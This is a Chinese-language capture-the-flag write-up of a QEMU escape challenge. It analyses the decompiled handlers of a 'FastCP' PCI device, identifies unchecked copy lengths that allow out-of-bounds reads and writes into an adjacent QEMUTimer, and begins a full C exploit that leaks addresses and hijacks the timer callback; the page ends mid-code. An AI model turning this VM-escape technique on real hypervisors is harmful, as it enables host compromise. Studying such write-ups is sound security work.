<p><strong>FastCP_instance_init</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)v1-&gt;CP_buffer = <span class="number">0L</span>L;</span><br><span class="line">*(_QWORD *)&amp;v1-&gt;CP_buffer[<span class="number">4088</span>] = <span class="number">0L</span>L;</span><br><span class="line"><span class="built_in">memset</span>(</span><br><span class="line">  (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)&amp;v1-&gt;CP_buffer[<span class="number">8</span>] &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  <span class="number">8L</span>L * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 - (((_DWORD)v1 + <span class="number">2568</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">6656</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">v1-&gt;cp_state.CP_list_src = <span class="number">0L</span>L;</span><br><span class="line">v1-&gt;cp_state.CP_list_cnt = <span class="number">0L</span>L;</span><br><span class="line">v1-&gt;cp_state.cmd = <span class="number">0L</span>L;</span><br><span class="line">v1-&gt;handling = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>初始化FastState对象的一些值</p>
<p><strong>fastcp_mmio_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">24</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mmio_read就是读一些值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        v4 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, v4 / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>handling标志timer是否已经触发，在运行，还没运行时才可以修改这些值</p>
<p>主要是设置src \  cnt \ cmd三个值</p>
<p>那么下面就是重点timer函数了</p>
<p><strong>fastcp_cp_timer</strong></p>
<p>这个函数的功能就是数据读写</p>
<p>先贴一个函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="keyword">uint8_t</span> *buf,<span class="keyword">int</span> len, <span class="keyword">int</span> is_write)</span></span></span><br></pre></td></tr></table></figure>
<p>这里用到的数据传输结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> CP_state        struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, copyof_4529)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> CP_list_src     dq ?</span><br><span class="line"><span class="number">00000008</span> CP_list_cnt     dq ?</span><br><span class="line"><span class="number">00000010</span> cmd             dq ?</span><br><span class="line"><span class="number">00000018</span> CP_state        ends</span><br></pre></td></tr></table></figure>
<p>cp_list_src是data msg的数组，CP_list_cnt是src中data msg的个数，cmd是指令</p>
<p>这里说的data msg是数据传输的消息结构，结构如下,包含数据传输的源地址，字节数，目的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCP_CP_INFO  struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, copyof_4531)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: fastcp_cp_timer/r</span><br><span class="line"><span class="number">00000000</span> CP_src          dq ?                    ; XREF: fastcp_cp_timer+<span class="number">24</span>/w</span><br><span class="line"><span class="number">00000000</span>                                         ; fastcp_cp_timer+<span class="number">1F</span>8/r ...</span><br><span class="line"><span class="number">00000008</span> CP_cnt          dq ?                    ; XREF: fastcp_cp_timer+<span class="number">2</span>C/w</span><br><span class="line"><span class="number">00000008</span>                                         ; fastcp_cp_timer+<span class="number">187</span>/r ...</span><br><span class="line"><span class="number">00000010</span> CP_dst          dq ?                    ; XREF: fastcp_cp_timer+<span class="number">35</span>/w</span><br><span class="line"><span class="number">00000010</span>                                         ; fastcp_cp_timer+<span class="number">20B</span>/r ...</span><br></pre></td></tr></table></figure>
<p>总共分为三个功能号</p>
<p>case 2 从CP_src中读数据到CP_buffer,这里对cnt进行了校验，没有漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2u</span>LL:                                  <span class="comment">// read</span></span><br><span class="line">  v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">  opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// read data msg</span></span><br><span class="line">    <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )         <span class="comment">// read做了cnt校验</span></span><br><span class="line">      cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);<span class="comment">// physical read</span></span><br><span class="line">    v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">    opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>case 4 从CP_buffer中写数据到CP_dst上，这里就忘了加cnt的校验了，因此存在越界读</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>LL:                                  <span class="comment">// write</span></span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// physical write</span></span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;<span class="comment">// 这里没对cnt做检验</span></span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>case 1,当CP_list_cnt会进入if，if是个搬运工，从CP_src中读到CP_buffer里，再从CP_buffer写到CP_dst里，这里也是忘了校验cnt了，导致从CP_src读到CP_buffer时存在写溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>LL:                                  <span class="comment">// cmd == 1</span></span><br><span class="line">      cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;                        <span class="comment">// 从src拷贝到dst，中间可以在buffer中溢出</span></span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);<span class="comment">// 这里没对cnt进行校验，存在溢出</span></span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// 从src中先拷贝出来cp_info,再进行读写</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>总结现在，对CP_buffer任意读写都有了，同时CP_buffer下面刚好是QemuTImer，因此可以通过读QemuTimer.cb来泄露程序基址，然后再覆写以劫持控制流</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这里有个小细节，我们在越界读时，因为一个物理页是0x1000，我们越界读0x1030个字节，会写到两个连续的物理页上，但是第二个物理页的虚拟地址并不是我们分配的，所以需要确定这我们分配的0x2000的虚拟地址对应的两个物理页是否连续(这个特性很难满足)</p>
<p>因此我们可以采用另外一种方法，即通过cmd2，把第二个物理页的内容再read回buf，然后再通过cmd4再写一次用户空间，也就是一次越界读，读写三次，因此我们可以把其封装到函数里面</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>QemuTimer结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> QEMUTimer_0     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1181)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> expire_time     dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list      dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> cb              dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> opaque          dq ?                    ; offset</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> attributes      dd ?</span><br><span class="line"><span class="number">0000002</span>C scale           dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0     ends</span><br></pre></td></tr></table></figure>
<p>因为不能执行shell，所以这里用成功用gnome-calculator弹出计算器</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220503220736450.png" alt="image-20220503220736450"></p>
<p>完整exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> CP_src;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_cnt;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span>* addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">"open pagemap"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printdsg</span><span class="params">(<span class="keyword">uint64_t</span>* addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"src: 0x%lx\n"</span>,*addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cnt: 0x%lx\n"</span>,*(addr+<span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"dst: 0x%lx\n"</span>,*(addr+<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> phy_addr1_1;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_addr1_2;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_addr2;</span><br><span class="line"><span class="keyword">uint64_t</span> date_msg_buf;</span><br><span class="line"><span class="keyword">uint8_t</span>* userbuf;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbRead</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//oob_read</span></span><br><span class="line">    <span class="comment">//((struct FastCP_CP_INFO*)date_msg_buf) -&gt; CP_cnt = 0x1030;</span></span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">1</span>) = <span class="number">0x1030</span>;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">2</span>) = phy_addr1_1;</span><br><span class="line">    printdsg((<span class="keyword">uint64_t</span>*)date_msg_buf);</span><br><span class="line">    <span class="comment">//((struct FastCP_CP_INFO*)date_msg_buf) -&gt; CP_dst = phy_addr1_1;</span></span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,phy_addr2);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//temp save databuf</span></span><br><span class="line">    <span class="comment">//((struct FastCP_CP_INFO*)date_msg_buf) -&gt; CP_cnt = 0x30;</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">1</span>) = <span 